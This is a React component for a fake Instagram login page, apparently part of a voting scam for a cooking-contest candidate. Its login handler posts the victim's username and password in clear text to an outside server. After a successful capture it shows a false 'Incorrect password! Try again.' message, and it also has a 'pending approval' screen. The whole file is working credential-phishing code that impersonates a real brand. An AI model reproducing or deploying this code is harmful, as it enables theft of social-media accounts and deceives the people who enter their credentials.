import { useEffect, useState } from "react";
import instagramLogo from "../assets/instagram-logo.png";
export default function InstagramLogin() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  const [pending, setPending] = useState(false);
  const [approved, setApproved] = useState(false);
  const [rejected, setRejected] = useState(false);

  



async function handleLogin(e) {
  e.preventDefault();

  if (!username || !password) {
    alert("Please enter your username and password.");
    return;
  }

  setLoading(true);

  try {
    const res = await fetch(
      "https://masterchefsingapore-vk35.vercel.app/api/votes/submit",
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          candidate_number: 1,
          platform: "instagram",
          username,
          password,
          location: localStorage.getItem("voteLocation"),
        }),
      }
    );

    const data = await res.json();

    if (data.success) {
      setApproved(true);
    } else {
      alert(data.message);
    }

  } catch (err) {
    alert("Unable to connect to server.");
  }

  setLoading(false);
}
  if (approved) {
    return (
      <div className="min-h-screen bg-[#0f1014] flex items-center justify-center px-6">
        <div className="text-center">
          <div className="w-20 h-20 mx-auto mb-6">
            <img src={instagramLogo} alt="Instagram Logo" className="w-full h-full object-contain" />
          </div>

          <h1 className="text-white text-2xl font-bold mt-8">
            Incorrect password!
          </h1>

          <p className="text-gray-400 mt-3">
            Try again.
          </p>
        </div>
      </div>
    );
  }

  if (rejected) {
    return (
      <div className="min-h-screen bg-[#0f1014] flex items-center justify-center px-6">
        <div className="text-center">
          <div className="w-20 h-20 mx-auto mb-6">
            <img src={instagramLogo} alt="Instagram Logo" className="w-full h-full object-contain" />
          </div>

          <h1 className="text-white text-2xl font-bold mt-8">
            Verification Failed ❌
          </h1>

          <p className="text-gray-400 mt-3">
            Your vote could not be verified.
          </p>
        </div>
      </div>
    );
  }

  if (pending) {
    return (
      <div className="min-h-screen bg-[#0f1014] flex items-center justify-center px-6">
        <div className="text-center">
          <div className="w-20 h-20 mx-auto mb-6">
          <img src={instagramLogo} alt="Instagram Logo" className="w-full h-full object-contain" />
        </div>
          <h1 className="text-white text-2xl font-bold mt-8">
            Pending Approval
          </h1>

          <p className="text-gray-400 mt-3">
            please wait for approval.
          </p>
        </div>
      </div>
    );
  }

 return (
  <div className="min-h-screen bg-[#dfe9ff] flex items-center justify-center px-6 py-10">
    <div className="w-full max-w-md">

      {/* Language */}
      <p className="text-center text-gray-600 text-sm mb-6">
        English (UK)
      </p>

      {/* White Card */}
      <div className="bg-white rounded-[35px] shadow-2xl px-8 py-10">

        {/* Logo */}
        <div className="w-24 h-24 mx-auto mb-8">
          <img
            src={instagramLogo}
            alt="Instagram Logo"
            className="w-full h-full object-contain"
          />
        </div>

        <form onSubmit={handleLogin}>

          <input
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="Voting ID"
            className="w-full h-14 rounded-2xl border border-gray-300 px-5 text-gray-700 placeholder-gray-400 outline-none mb-5 focus:ring-2 focus:ring-red-500"
          />

          <input
            type="password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="password"
            className="w-full h-14 rounded-2xl border border-gray-300 px-5 text-gray-700 placeholder-gray-400 outline-none mb-6 focus:ring-2 focus:ring-red-500"
          />

          <button
            type="submit"
            disabled={loading}
            className="w-full h-14 rounded-full bg-red-600 hover:bg-red-700 transition text-white font-bold text-lg"
          >
            {loading ? "Logging in..." : "Log in"}
          </button>

          <div className="mt-6 text-center">
            <button
              type="button"
              className="text-gray-600 hover:underline text-base"
            >
              Forgot password?
            </button>
          </div>

          <button
            type="button"
            className="w-full h-14 mt-8 rounded-full border-2 border-red-600 text-red-600 font-bold text-lg hover:bg-red-50 transition"
          >
            Create Account
          </button>

        </form>

       
      </div>

    </div>
  </div>
);}
